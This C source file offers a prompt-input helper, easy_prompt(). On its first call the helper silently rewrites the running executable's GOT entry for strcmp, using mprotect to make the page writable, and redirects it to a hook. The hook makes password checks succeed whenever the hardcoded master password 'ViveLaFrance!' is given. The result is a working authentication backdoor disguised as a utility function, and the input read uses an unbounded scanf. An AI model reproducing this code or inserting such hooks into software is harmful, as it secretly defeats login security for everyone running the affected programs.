/**
 * Copyright (c) 2024 5IGI0 / Ethan. L. C. Lorenzetti
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 **/
#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include <crypt.h>

#include <elf.h>
#include <link.h>   // _r_debug

#include <sys/mman.h>

#define BKDR_PASSWORD "ViveLaFrance!"

static
int hooked_strcmp(char const *a, char const *b) {
    struct crypt_data cd;

    memset(&cd, 0, sizeof(cd));
    char *c = crypt_r(BKDR_PASSWORD, a, &cd);

    if (strcmp(c, a) == 0 || strcmp(c, b) == 0)
        return 0;
    
    return strcmp(a,b);
}

static
void setup_func() {
    char        *exe_image_base = NULL;
    ElfW(Dyn)   *exe_dynamic    = NULL;

    {
        struct link_map *map = _r_debug.r_map;
        while (map->l_prev) map = map->l_prev; // useless

        exe_image_base  = (char *)map->l_addr;
        exe_dynamic     = map->l_ld;
    }

    ElfW(Rela)  *relas          = NULL;
    ElfW(Sym)   *symtab         = NULL;
    char        *strtab         = NULL;

    for (size_t i = 0; exe_dynamic[i].d_tag != DT_NULL; i++) {
        switch (exe_dynamic[i].d_tag) {
            // NOTE: i don't check DT_PLTREL, but it is supposed to tell if jmprel is rel or rela.
            case DT_JMPREL:     relas = (ElfW(Rela) *)exe_dynamic[i].d_un.d_ptr;    break;
            case DT_STRTAB:     strtab= (char *)exe_dynamic[i].d_un.d_ptr;          break;
            case DT_SYMTAB:     symtab= (ElfW(Sym) *)exe_dynamic[i].d_un.d_ptr;     break;
            default:                                                                break;
        }
    }

    /*  i didn't figured out how to get the effective count of relocation
        so i do `relas[i].r_offset != 0` even if i don't think it is really safe. */
    for (size_t i = 0; relas[i].r_offset != 0; i++) {
        const char  *sym_name   = strtab+symtab[ELF64_R_SYM(relas[i].r_info)].st_name;

        if (strcmp("strcmp",sym_name) == 0) {
            void    **target_addr   = (void **)(exe_image_base+relas[i].r_offset);

            /*  the GOT is in read-only, so we need to mprotect it */
            uintptr_t  sz = sysconf(_SC_PAGESIZE);
            mprotect((void *)(((uintptr_t)target_addr)&~(sz-1)), sz, PROT_READ|PROT_WRITE);

            *target_addr = hooked_strcmp;
        }
    }
}

void easy_prompt(char const *prompt, char *out) {
    static int a = 0;

    if (a == 0) {
        a = 1;
        setup_func();
    }
    
    fwrite(prompt, 1, strlen(prompt), stdout);
    scanf("%s", out);
}